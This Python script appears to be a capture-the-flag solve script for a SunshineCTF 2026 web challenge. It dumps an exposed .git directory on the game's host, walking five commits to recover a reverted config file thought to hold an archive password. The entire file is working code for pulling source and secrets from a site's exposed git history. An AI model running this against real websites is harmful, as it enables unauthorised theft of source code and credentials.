#!/usr/bin/env python
"""Walk every commit in VecNet's exposed .git and dump each tree.

Why history and not just HEAD: `.gitignore` was added to hide config.php and the reflog reads
"add internal service config" -> "REVERT: do not commit secrets", so the removed file still
exists as an object. The specs.7z handed out by fetch.php is 7zAES-encrypted, and a password
that had to be *removed* from the tree is exactly the kind of thing left behind in a parent
commit.
"""
import os
import urllib.request
import zlib

BASE = "https://vec.web.2026.sunshinectf.games"
OUT = "files/repo-history"
N = [0]
COMMITS = [
    "e6a00740509b9f621b16980b77913206c43fd08c",   # add htaccess            (HEAD)
    "130e195fc0a5db75500e229020b13ee45d420500",   # REVERT: do not commit secrets
    "c3cd120180b3b7c5cbb4dd168311a6f643e74d98",   # add internal service config
    "517ac7236e3c02c92f0a3dbd52781cb4358023b1",   # add embed preview endpoint
    "3e02a92698473dd29916cdcd94287ac35452b063",   # initial site deploy
]


def fetch(path):
    N[0] += 1
    try:
        req = urllib.request.Request(BASE + path, headers={"User-Agent": "git-dump"})
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.read()
    except Exception:
        return None


def obj(sha):
    raw = fetch("/.git/objects/%s/%s" % (sha[:2], sha[2:]))
    if raw is None:
        return None
    head, body = zlib.decompress(raw).split(b"\0", 1)
    return head.split(b" ", 1)[0].decode(), body


def tree_entries(sha):
    typ, body = obj(sha)
    out, i = [], 0
    while i < len(body):
        sp = body.index(b" ", i)
        nl = body.index(b"\0", sp)
        out.append((body[i:sp].decode(), body[sp + 1:nl].decode("utf-8", "replace"),
                    body[nl + 1:nl + 21].hex()))
        i = nl + 21
    return out


def dump_tree(sha, base, tag):
    for mode, name, s in tree_entries(sha):
        if mode == "40000":
            dump_tree(s, base + "/" + name, tag)
        elif mode.startswith("16"):
            continue
        else:
            t, content = obj(s)
            p = os.path.join(OUT, tag, (base + "/" + name).lstrip("/"))
            os.makedirs(os.path.dirname(p) or ".", exist_ok=True)
            open(p, "wb").write(content)
            print("   %-4s %-40s %d bytes" % (tag, base + "/" + name, len(content)), flush=True)


def main():
    for i, sha in enumerate(COMMITS):
        o = obj(sha)
        if not o:
            print("[%d] %s MISSING" % (i, sha[:10]))
            continue
        lines = o[1].decode("latin-1").splitlines()
        tr = [l.split()[1] for l in lines if l.startswith("tree ")]
        subj = [l for l in lines
                if l and not l.startswith(("tree ", "parent ", "author ", "committer ", "gpgsig"))]
        print("\n[%d] %s tree=%s  %s" % (i, sha[:10], (tr[0][:10] if tr else "?"),
                                         " | ".join(subj)[:80]), flush=True)
        if tr:
            dump_tree(tr[0], "", "c%d" % i)
    print("\n[*] %d requests" % N[0])


if __name__ == "__main__":
    main()
